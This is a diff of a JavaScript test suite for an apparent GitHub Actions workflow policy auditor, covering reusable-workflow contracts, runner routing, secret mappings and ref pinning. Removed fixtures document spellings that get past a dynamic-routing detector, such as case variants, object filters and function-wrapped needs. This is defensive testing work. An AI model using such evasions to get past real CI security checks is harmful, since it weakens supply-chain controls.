-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FULLY_BRACKETED_SOURCE.replace(
-    "    steps: []",
-    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
-  );
-
-// The finding that motivated replacing the precise needs.<job>.outputs.<name>
-// (plus index-syntax) detector with a coarse needs-reference catch-all: an
-// object filter such as `needs.*.outputs.runner` -- typically wrapped in
-// `join(needs.*.outputs.runner, '')` -- has no named job-id segment at all,
-// so a detector shaped around "job-id segment, then outputs segment, then
-// name segment" can never enumerate it structurally, no matter how many
-// dot/bracket spellings of the job-id and outputs segments it special-cases.
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_OBJECT_FILTER_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
-    "needs.pick.outputs.runner",
-    "join(needs.*.outputs.runner, '')",
-  );
-
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_OBJECT_FILTER_COSMETIC_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_OBJECT_FILTER_SOURCE.replace(
-    "    steps: []",
-    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
-  );
-
-// GitHub's expression evaluator treats context and property names
-// case-insensitively (documented for the `secrets` context; empirically
-// confirmed more broadly for functions and context access). A candidate
-// that spelled the indirection in another letter case would defeat a
-// case-sensitive literal match while remaining functionally identical to
-// the lowercase form GitHub actually evaluates.
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_CASE_VARIANT_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
-    "needs.pick.outputs.runner",
-    "NEEDS.pick.OUTPUTS.runner",
-  );
-
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_CASE_VARIANT_COSMETIC_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_CASE_VARIANT_SOURCE.replace(
-    "    steps: []",
-    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
-  );
-
-// Proves the coarse catch-all catches strictly more than the precise
-// needs.<job>.outputs.<name>-shaped detector it replaced, not just the
-// reported object-filter gap. A job can route on another job's `result` (or
-// any other needs property) without ever mentioning `outputs`; the old
-// detector's pattern required a literal `outputs` segment, so
-// `needs.pick.result` passed through undetected even though the producing
-// job's result is exactly as unresolvable through static surface-diffing as
-// its outputs would be.
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_JOB_RESULT_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
-    "needs.pick.outputs.runner",
-    "needs.pick.result == 'success' && 'self-hosted' || 'ubuntu-24.04'",
-  );
-
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_JOB_RESULT_COSMETIC_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_JOB_RESULT_SOURCE.replace(
-    "    steps: []",
-    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
-  );
-
-// Proves the catch-all matches the bare `needs` token itself, not only
-// `needs` immediately followed by `.` or `[`. GitHub's expression functions
-// can take `needs` as a bare argument and return a dereferenceable object,
-// e.g. `fromJSON(toJSON(needs)).pick.outputs.runner`: the token right after
-// `needs` is the function's closing `)`, so a detector that required an
-// immediate `.`/`[` accessor would miss this even though the routing field
-// still ultimately dereferences an unresolvable producer-side value.
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FUNCTION_WRAPPED_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
-    "needs.pick.outputs.runner",
-    "fromJSON(toJSON(needs)).pick.outputs.runner",
-  );
-
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FUNCTION_WRAPPED_COSMETIC_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FUNCTION_WRAPPED_SOURCE.replace(
-    "    steps: []",
-    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
-  );
-
-function reusableWorkflowWithCallMappings({ inputs, secrets } = {}) {
-  const declaration = [
-    "  workflow_call:",
-    ...(inputs === undefined ? [] : [`    inputs:${inputs === null ? "" : ` ${inputs}`}`]),
-    ...(secrets === undefined ? [] : [`    secrets:${secrets === null ? "" : ` ${secrets}`}`]),
-  ].join("\n");
-  return `name: hosted-check
-on:
-${declaration}
-permissions:
-  contents: read
-jobs:
-  check:
-    runs-on: ubuntu-24.04
-    steps: []
-`;
 }
 
 test.after(async () => {
@@ -1176,11 +219,10 @@ test("GitHub visibility evidence must agree with governed inventory", async () =
 });
 
 const CLAUDE_REVIEW_PATH = "melodic-software/ci-workflows/.github/workflows/claude-review.yml";
-const CLAUDE_REVIEW_SENSITIVE_REFERENCE = `${CLAUDE_REVIEW_PATH}@${SHA}`;
 
 function claudeReviewSensitiveContract(overrides = {}) {
   return {
-    [CLAUDE_REVIEW_SENSITIVE_REFERENCE]: {
+    [CLAUDE_REVIEW_PATH]: {
       routing: "runner-input",
       runnerInput: "runner",
       allowedInputs: ["runner", "standards-ref"],
@@ -1214,7 +256,7 @@ test("public repository rejects claude-review contracts listing visibility-scope
     {
       rule: "visibility-scoped-reusable-contract",
       file: "runner-policy-policy.json",
-      message: `reusable workflow contract ${CLAUDE_REVIEW_SENSITIVE_REFERENCE} lists visibility-scoped surface (STANDARDS_REVIEW_APP_ID, standards-ref) while this repository is public; shared contracts cannot enable sensitive inputs for private consumers only`,
+      message: `reusable workflow contract ${CLAUDE_REVIEW_PATH} lists visibility-scoped surface (STANDARDS_REVIEW_APP_ID, standards-ref) while this repository is public; shared contracts cannot enable sensitive inputs for private consumers only`,
     },
   ]);
 });
@@ -1227,7 +269,7 @@ for (const workflowFile of ["pr-review.yml", "pr-review-security.yml"]) {
       selfHostedCi: false,
       policyOverrides: {
         approvedReusableWorkflowContracts: {
-          [reference]: claudeReviewSensitiveContract()[CLAUDE_REVIEW_SENSITIVE_REFERENCE],
+          [pathOf(reference)]: claudeReviewSensitiveContract()[CLAUDE_REVIEW_PATH],
         },
       },
       workflows: {
@@ -1239,7 +281,7 @@ for (const workflowFile of ["pr-review.yml", "pr-review-security.yml"]) {
       {
         rule: "visibility-scoped-reusable-contract",
         file: "runner-policy-policy.json",
-        message: `reusable workflow contract ${reference} lists visibility-scoped surface (STANDARDS_REVIEW_APP_ID, standards-ref) while this repository is public; shared contracts cannot enable sensitive inputs for private consumers only`,
+        message: `reusable workflow contract ${pathOf(reference)} lists visibility-scoped surface (STANDARDS_REVIEW_APP_ID, standards-ref) while this repository is public; shared contracts cannot enable sensitive inputs for private consumers only`,
       },
     ]);
   });
@@ -1275,7 +317,7 @@ test("visibility-scoped reusable contract surface fails closed without CI_REPOSI
     {
       rule: "visibility-evidence-required",
       file: "runner-policy-policy.json",
-      message: `reusable workflow contract ${CLAUDE_REVIEW_SENSITIVE_REFERENCE} lists visibility-scoped surface (STANDARDS_REVIEW_APP_ID, standards-ref); CI_REPOSITORY_VISIBILITY is required`,
+      message: `reusable workflow contract ${CLAUDE_REVIEW_PATH} lists visibility-scoped surface (STANDARDS_REVIEW_APP_ID, standards-ref); CI_REPOSITORY_VISIBILITY is required`,
     },
   ]);
 });
@@ -1286,7 +328,7 @@ test("public repository rejects claude-review contracts mapping denylisted secre
     selfHostedCi: false,
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [CLAUDE_REVIEW_SENSITIVE_REFERENCE]: {
+        [CLAUDE_REVIEW_PATH]: {
           routing: "hosted-only",
           allowedInputs: [],
           allowedSecrets: {
@@ -1305,7 +347,7 @@ test("public repository rejects claude-review contracts mapping denylisted secre
     {
       rule: "visibility-scoped-reusable-contract",
       file: "runner-policy-policy.json",
-      message: `reusable workflow contract ${CLAUDE_REVIEW_SENSITIVE_REFERENCE} lists visibility-scoped surface (STANDARDS_REVIEW_APP_ID) while this repository is public; shared contracts cannot enable sensitive inputs for private consumers only`,
+      message: `reusable workflow contract ${CLAUDE_REVIEW_PATH} lists visibility-scoped surface (STANDARDS_REVIEW_APP_ID) while this repository is public; shared contracts cannot enable sensitive inputs for private consumers only`,
     },
   ]);
 });
@@ -1316,7 +358,7 @@ test("aliased denylisted secret mapping requires CI_REPOSITORY_VISIBILITY", asyn
     selfHostedCi: false,
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [CLAUDE_REVIEW_SENSITIVE_REFERENCE]: {
+        [CLAUDE_REVIEW_PATH]: {
           routing: "hosted-only",
           allowedInputs: [],
           allowedSecrets: {
@@ -1335,7 +377,7 @@ test("aliased denylisted secret mapping requires CI_REPOSITORY_VISIBILITY", asyn
     {
       rule: "visibility-evidence-required",
       file: "runner-policy-policy.json",
-      message: `reusable workflow contract ${CLAUDE_REVIEW_SENSITIVE_REFERENCE} lists visibility-scoped surface (STANDARDS_REVIEW_APP_PRIVATE_KEY); CI_REPOSITORY_VISIBILITY is required`,
+      message: `reusable workflow contract ${CLAUDE_REVIEW_PATH} lists visibility-scoped surface (STANDARDS_REVIEW_APP_PRIVATE_KEY); CI_REPOSITORY_VISIBILITY is required`,
     },
   ]);
 });
@@ -1401,7 +443,6 @@ test("production policy and claude-review callers stay green under visibility ev
       root,
       policyPath: path.join(root, "policy.json"),
       repositoryVisibility: "public",
-      fetchImpl: HERMETIC_FETCH_STUB,
     }),
     [],
   );
@@ -2330,7 +1371,7 @@ test("a packages-only hosted-reusable caller cannot smuggle a credential input v
   };
   const smuggled = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: contract },
+      approvedReusableWorkflowContracts: { [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: contract },
     },
     exceptions: {
       ".github/workflows/publish.yml#publish": {
@@ -2365,7 +1406,7 @@ jobs:
 
   const clean = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: contract },
+      approvedReusableWorkflowContracts: { [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: contract },
     },
     exceptions: {
       ".github/workflows/publish.yml#publish": {
@@ -2824,7 +1865,7 @@ test("a local-routing grant never applies to a reusable-call job", async () => {
   const root = await repository({
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [FLEET_CLAUDE_REVIEW_REFERENCE]: {
+        [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: {
           routing: "runner-input",
           runnerInput: "runner",
           allowedInputs: ["runner", "skip-actors"],
@@ -3084,87 +2125,6 @@ test("hosted matrix expression policy remains required, unique, and structurally
   }
 });
 
-test("the live policy admits none of the historical contracts", () => {
-  for (const key of Object.keys(HISTORICAL_CONTRACTS)) {
-    assert.equal(BASE_POLICY.approvedReusableWorkflowContracts[key], undefined, key);
-  }
-});
-
-test("production contracts pin reviewed Windows and selectable Linux workflows", () => {
-  assertLiveSuccessors(["claude-review", "standards-sync", "zizmor", "osv-scanner"]);
-  const contracts = HISTORICAL_CONTRACTS;
-  assert.deepEqual(
-    contracts[
-      `melodic-software/ci-workflows/.github/workflows/claude-review.yml@${PRODUCTION_SHA}`
-    ],
-    {
-      routing: "hosted-only",
-      allowedInputs: ["skip-actors"],
-      allowedSecrets: {
-        CLAUDE_CODE_OAUTH_TOKEN: `\${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}`,
-      },
-      fixedRunsOn: ["ubuntu-24.04"],
-    },
-  );
-  assert.deepEqual(
-    contracts[
-      "melodic-software/ci-workflows/.github/workflows/claude-review.yml@1d3762c2ace413db0f347048307946c46850161c"
-    ].allowedInputs,
-    [],
-  );
-  assert.deepEqual(contracts[STANDARDS_SYNC_REUSABLE_REFERENCE], {
-    routing: "hosted-only",
-    allowedInputs: ["dry-run", "targets"],
-    allowedSecrets: {
-      "app-client-id": `\${{ secrets.STANDARDS_SYNC_APP_CLIENT_ID }}`,
-      "app-private-key": `\${{ secrets.STANDARDS_SYNC_APP_PRIVATE_KEY }}`,
-    },
-    fixedRunsOn: ["ubuntu-24.04"],
-  });
-  assert.deepEqual(
-    contracts[`melodic-software/ci-workflows/.github/workflows/zizmor.yml@${LOCAL_SELECTOR_SHA}`],
-    {
-      routing: "runner-input",
-      runnerInput: "runner",
-      allowedInputs: ["runner", "paths"],
-      allowedSecrets: {},
-    },
-  );
-  assert.deepEqual(
-    contracts[
-      `melodic-software/ci-workflows/.github/workflows/osv-scanner.yml@${SECURITY_HARDENING_SHA}`
-    ],
-    {
-      routing: "runner-input",
-      runnerInput: "runner",
-      allowedInputs: ["runner"],
-      allowedSecrets: {},
-    },
-  );
-  assert.deepEqual(
-    contracts[
-      `melodic-software/ci-workflows/.github/workflows/zizmor.yml@${SECURITY_HARDENING_SHA}`
-    ],
-    {
-      routing: "runner-input",
-      runnerInput: "runner",
-      allowedInputs: ["runner", "paths"],
-      allowedSecrets: {},
-    },
-  );
-  for (const sha of [REPINE_LANE_SHA_V0_14_2, REPINE_LANE_SHA_V0_17_0]) {
-    assert.deepEqual(
-      contracts[`melodic-software/ci-workflows/.github/workflows/osv-scanner.yml@${sha}`],
-      {
-        routing: "runner-input",
-        runnerInput: "runner",
-        allowedInputs: ["runner", "scan-args", "fail-on-vuln", "allow-no-lockfiles"],
-        allowedSecrets: {},
-      },
-    );
-  }
-});
-
 test("a claude-review caller routes to the review tier without findings", async () => {
   // Executable spec for the Campaign A flip: the claude-review reusable call
   // names the review-tier fleet label as its runner input under the reviewed
@@ -3173,7 +2133,7 @@ test("a claude-review caller routes to the review tier without findings", async 
   const root = await repository({
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [FLEET_CLAUDE_REVIEW_REFERENCE]: {
+        [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: {
           routing: "runner-input",
           runnerInput: "runner",
           allowedInputs: ["runner", "skip-actors"],
@@ -3211,7 +2171,7 @@ test("repository-required reusable inputs fail when a configured input is absent
   };
   const root = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: contract },
+      approvedReusableWorkflowContracts: { [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: contract },
     },
     requiredReusableCallInputs: {
       ".github/workflows/claude-review.yml#review": {
@@ -3261,7 +2221,7 @@ test("repository-required reusable inputs are presence-only", async () => {
   };
   const root = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: contract },
+      approvedReusableWorkflowContracts: { [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: contract },
     },
     requiredReusableCallInputs: {
       ".github/workflows/claude-review.yml#review": {
@@ -3306,7 +2266,7 @@ test("repository-required reusable inputs pass when every configured input is pr
   };
   const root = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: contract },
+      approvedReusableWorkflowContracts: { [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: contract },
     },
     requiredReusableCallInputs: {
       ".github/workflows/claude-review.yml#review": {
@@ -3363,7 +2323,7 @@ test("required reusable call inputs must name inputs admitted by the reviewed co
   const root = await repository({
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [FLEET_CLAUDE_REVIEW_REFERENCE]: {
+        [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: {
           routing: "runner-input",
           runnerInput: "runner",
           allowedInputs: ["runner"],
@@ -3414,7 +2374,7 @@ test("repository-required reusable inputs ignore repository-local wrapper calls"
   };
   const root = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: contract },
+      approvedReusableWorkflowContracts: { [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: contract },
     },
     requiredReusableCallInputs: {
       ".github/workflows/claude-review.yml#review": {
@@ -3484,7 +2444,7 @@ test("reviewed runner-input workflow may receive one exact local permission boun
   const root = await repository({
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [FLEET_CLAUDE_REVIEW_REFERENCE]: {
+        [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: {
           routing: "runner-input",
           runnerInput: "runner",
           allowedInputs: ["runner", "skip-actors"],
@@ -3537,7 +2497,7 @@ test("the reviewed caller permission waiver applies only to fleet-routed calls",
 
   const fleetRouted = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: contract },
+      approvedReusableWorkflowContracts: { [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: contract },
     },
     workflows: {
       "claude-review.yml": `permissions: read-all
@@ -3556,7 +2516,7 @@ ${permissions}    uses: ${FLEET_CLAUDE_REVIEW_REFERENCE}
 
   const fixedHostedNoException = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: contract },
+      approvedReusableWorkflowContracts: { [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: contract },
     },
     workflows: {
       "claude-review.yml": `permissions: read-all
@@ -3581,7 +2541,7 @@ ${permissions}    uses: ${FLEET_CLAUDE_REVIEW_REFERENCE}
 
   const fixedHostedWrongCategory = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: contract },
+      approvedReusableWorkflowContracts: { [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: contract },
     },
     exceptions: {
       ".github/workflows/claude-review.yml#review": {
@@ -3610,7 +2570,7 @@ ${permissions}    uses: ${FLEET_CLAUDE_REVIEW_REFERENCE}
 
   const fixedHostedCorrectCategory = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: contract },
+      approvedReusableWorkflowContracts: { [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: contract },
     },
     exceptions: {
       ".github/workflows/claude-review.yml#review": {
@@ -3647,7 +2607,7 @@ test("runner-input local permission boundary rejects every caller permission dri
     const root = await repository({
       policyOverrides: {
         approvedReusableWorkflowContracts: {
-          [FLEET_CLAUDE_REVIEW_REFERENCE]: {
+          [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: {
             routing: "runner-input",
             runnerInput: "runner",
             allowedInputs: ["runner"],
@@ -3712,7 +2672,7 @@ test("reviewed caller permissions do not authorize other credential surfaces", a
     const root = await repository({
       policyOverrides: {
         approvedReusableWorkflowContracts: {
-          [FLEET_CLAUDE_REVIEW_REFERENCE]: {
+          [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: {
             routing: "runner-input",
             runnerInput: "runner",
             allowedInputs: scenario.allowedInputs,
@@ -3748,7 +2708,7 @@ test("reviewed caller secret mapping remains exact", async () => {
   const root = await repository({
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [FLEET_CLAUDE_REVIEW_REFERENCE]: {
+        [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: {
           routing: "runner-input",
           runnerInput: "runner",
           allowedInputs: ["runner"],
@@ -3797,7 +2757,7 @@ test("privileged reusable contracts accept only direct same-name secret mappings
     const root = await repository({
       policyOverrides: {
         approvedReusableWorkflowContracts: {
-          [FLEET_CLAUDE_REVIEW_REFERENCE]: {
+          [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: {
             routing: "runner-input",
             runnerInput: "runner",
             allowedInputs: ["runner"],
@@ -3848,7 +2808,9 @@ jobs:
 test("a privileged contract that declares a role accepts that role's prefixed secret", async () => {
   const root = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: roleContract() },
+      approvedReusableWorkflowContracts: {
+        [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: roleContract(),
+      },
     },
     workflows: { "intake.yml": roleCaller("automations") },
   });
@@ -3864,7 +2826,7 @@ test("a role-prefixed secret is refused for another role or with no declared rol
   ]) {
     const root = await repository({
       policyOverrides: {
-        approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: contract },
+        approvedReusableWorkflowContracts: { [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: contract },
       },
     });
     await assert.rejects(() => audit(root), /allowedSecrets\.CLAUDE_API_KEY must be exactly/);
@@ -3875,7 +2837,7 @@ test("a contract that declares a role must allow the role input", async () => {
   const root = await repository({
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [FLEET_CLAUDE_REVIEW_REFERENCE]: roleContract({ allowedInputs: ["runner"] }),
+        [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: roleContract({ allowedInputs: ["runner"] }),
       },
     },
   });
@@ -3885,7 +2847,9 @@ test("a contract that declares a role must allow the role input", async () => {
 test("a caller must pass the contract's role as a literal", async () => {
   const root = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: roleContract() },
+      approvedReusableWorkflowContracts: {
+        [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: roleContract(),
+      },
     },
     workflows: { "intake.yml": roleCaller("reviews") },
   });
@@ -3906,7 +2870,7 @@ test("every runner-input contract accepts only whole named-secret mapping values
     const root = await repository({
       policyOverrides: {
         approvedReusableWorkflowContracts: {
-          [FLEET_CLAUDE_REVIEW_REFERENCE]: {
+          [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: {
             routing: "runner-input",
             runnerInput: "runner",
             allowedInputs: ["runner"],
@@ -3933,7 +2897,7 @@ test("privileged reusable contracts use only official permission scope access va
     const root = await repository({
       policyOverrides: {
         approvedReusableWorkflowContracts: {
-          [FLEET_CLAUDE_REVIEW_REFERENCE]: {
+          [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: {
             routing: "runner-input",
             runnerInput: "runner",
             allowedInputs: ["runner"],
@@ -3956,7 +2920,7 @@ test("local permission contract must authorize at least one exact write scope", 
   const root = await repository({
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [FLEET_CLAUDE_REVIEW_REFERENCE]: {
+        [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: {
           routing: "runner-input",
           runnerInput: "runner",
           allowedInputs: ["runner"],
@@ -3998,7 +2962,10 @@ async function minimumPermissionRepository(minimumCallerPermissions, caller, ove
   return repository({
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [REUSABLE_REFERENCE]: MINIMUM_PERMISSION_CONTRACT(minimumCallerPermissions, overrides),
+        [pathOf(REUSABLE_REFERENCE)]: MINIMUM_PERMISSION_CONTRACT(
+          minimumCallerPermissions,
+          overrides,
+        ),
       },
     },
     workflows: { "ci.yml": caller },
@@ -4154,7 +3121,7 @@ test("a secret-capable runner-input contract admits a statically read-only fleet
   const root = await repository({
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [SYNC_RUNNER_INPUT_REFERENCE]: SYNC_RUNNER_INPUT_CONTRACT,
+        [pathOf(SYNC_RUNNER_INPUT_REFERENCE)]: SYNC_RUNNER_INPUT_CONTRACT,
       },
     },
     workflows: {
@@ -4179,7 +3146,7 @@ test("a secret-capable runner-input caller must pass the exact reviewed secret m
   const root = await repository({
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [SYNC_RUNNER_INPUT_REFERENCE]: SYNC_RUNNER_INPUT_CONTRACT,
+        [pathOf(SYNC_RUNNER_INPUT_REFERENCE)]: SYNC_RUNNER_INPUT_CONTRACT,
       },
     },
     workflows: {
@@ -4221,7 +3188,7 @@ test("a secret-capable runner-input contract does not waive caller write permiss
   const root = await repository({
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [SYNC_RUNNER_INPUT_REFERENCE]: SYNC_RUNNER_INPUT_CONTRACT,
+        [pathOf(SYNC_RUNNER_INPUT_REFERENCE)]: SYNC_RUNNER_INPUT_CONTRACT,
       },
     },
     workflows: {
@@ -4263,7 +3230,7 @@ jobs:
   };
   const policyOverrides = {
     approvedReusableWorkflowContracts: {
-      [SYNC_RUNNER_INPUT_REFERENCE]: SYNC_RUNNER_INPUT_CONTRACT,
+      [pathOf(SYNC_RUNNER_INPUT_REFERENCE)]: SYNC_RUNNER_INPUT_CONTRACT,
     },
   };
 
@@ -4309,2295 +3276,91 @@ jobs:
   );
 });
 
-test("obsolete reusable workflow SHA is outside the exact reviewed contract", async () => {
-  const obsolete = "fedcba9876543210fedcba9876543210fedcba98";
-  const root = await repository({
+function publicReusableCaller(uses) {
+  return `jobs:\n  scan:\n    uses: ${uses}\n    with:\n      runner: ubuntu-24.04\n`;
+}
+
+test("a first-party reusable call matches its path contract at @main or any full commit SHA", async () => {
+  for (const ref of ["main", "fedcba9876543210fedcba9876543210fedcba98", SHA]) {
+    const root = await repository({
+      visibility: "public",
+      selfHostedCi: false,
+      workflows: { "ci.yml": publicReusableCaller(`${REUSABLE_PATH}@${ref}`) },
+    });
+    assert.deepEqual(await audit(root), [], ref);
+  }
+});
+
+test("a reusable call at a tag or another branch is not approved", async () => {
+  for (const ref of ["v1.2.3", "some-branch"]) {
+    const root = await repository({
+      visibility: "public",
+      selfHostedCi: false,
+      workflows: { "ci.yml": publicReusableCaller(`${REUSABLE_PATH}@${ref}`) },
+    });
+    const findings = await audit(root);
+    assert.deepEqual(
+      findings.map(({ rule }) => rule),
+      ["runner-target-contract"],
+      ref,
+    );
+    assert.equal(
+      findings[0].message,
+      `the reusable workflow ref @${ref} is not approved; use @main or a full 40-character commit SHA`,
+    );
+  }
+});
+
+test("a third-party reusable call must pin a full commit SHA, never @main", async () => {
+  const thirdParty = "other-owner/workflows/.github/workflows/scan.yml";
+  const policyOverrides = {
+    approvedReusableWorkflowContracts: {
+      [thirdParty]: {
+        routing: "runner-input",
+        runnerInput: "runner",
+        allowedInputs: ["runner"],
+        allowedSecrets: {},
+      },
+    },
+  };
+  const pinned = await repository({
     visibility: "public",
     selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${REUSABLE_PATH}@${obsolete}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
+    policyOverrides,
+    workflows: { "ci.yml": publicReusableCaller(`${thirdParty}@${SHA}`) },
+  });
+  assert.deepEqual(await audit(pinned), []);
+  const floating = await repository({
+    visibility: "public",
+    selfHostedCi: false,
+    policyOverrides,
+    workflows: { "ci.yml": publicReusableCaller(`${thirdParty}@main`) },
   });
   assert.deepEqual(
-    (await audit(root)).map(({ rule }) => rule),
-    ["runner-target-contract"],
+    (await audit(floating)).map(({ message }) => message),
+    ["the reusable workflow ref @main is not approved; use a full 40-character commit SHA"],
   );
 });
 
-test("Dependabot SHA bump with an identical security surface is auto-approved", async () => {
+test("a policy contract key carrying an @ref is rejected", async () => {
   const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_IDENTICAL_SURFACE_SOURCE,
-    }),
-  });
-  assert.deepEqual(findings, []);
-});
-
-const RELEASE_TAG_OBJECT_SHA = "fedcba9876543210fedcba9876543210fedcba98";
-const NOT_A_RELEASE_COMMIT = `${DEPENDABOT_BUMP_REFERENCE} is not the commit of an immutable, published, non-prerelease release tag of melodic-software/ci-workflows, so auto-approval is declined`;
-
-async function releaseCheckFindings(wrap) {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  return audit(root, {
-    fetchImpl: wrap(
-      fetchImplFor({
-        [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_IDENTICAL_SURFACE_SOURCE,
-      }),
-    ),
-  });
-}
-
-for (const [label, tags, options, expected] of [
-  [
-    "approves a lightweight release-tag commit",
-    [["v0.65.13", { type: "commit", sha: DEPENDABOT_BUMP_SHA }]],
-    {},
-    null,
-  ],
-  [
-    "peels an annotated release tag to its commit",
-    [["v0.65.13", { type: "tag", sha: RELEASE_TAG_OBJECT_SHA }]],
-    { tagObjects: { [RELEASE_TAG_OBJECT_SHA]: { type: "commit", sha: DEPENDABOT_BUMP_SHA } } },
-    null,
-  ],
-  [
-    "declines an annotated release tag that peels to another commit",
-    [["v0.65.12", { type: "tag", sha: RELEASE_TAG_OBJECT_SHA }]],
-    { tagObjects: { [RELEASE_TAG_OBJECT_SHA]: { type: "commit", sha: SHA } } },
-    NOT_A_RELEASE_COMMIT,
-  ],
-  [
-    "declines a non-release SHA with an identical surface",
-    [["v0.65.12", { type: "commit", sha: SHA }]],
-    {},
-    NOT_A_RELEASE_COMMIT,
-  ],
-  [
-    "declines a tag without a release",
-    [["v0.65.13", { type: "commit", sha: DEPENDABOT_BUMP_SHA }]],
-    { release: null },
-    NOT_A_RELEASE_COMMIT,
-  ],
-  ...[{ draft: true }, { prerelease: true }, { immutable: false }].map((release) => [
-    `declines a release with ${JSON.stringify(release)}`,
-    [["v0.65.13", { type: "commit", sha: DEPENDABOT_BUMP_SHA }]],
-    { release },
-    NOT_A_RELEASE_COMMIT,
-  ]),
-]) {
-  test(`Dependabot SHA bump release check ${label}`, async () => {
-    const findings = await releaseCheckFindings((inner) => releaseFetchImpl(inner, tags, options));
-    if (expected === null) {
-      assert.deepEqual(findings, []);
-    } else {
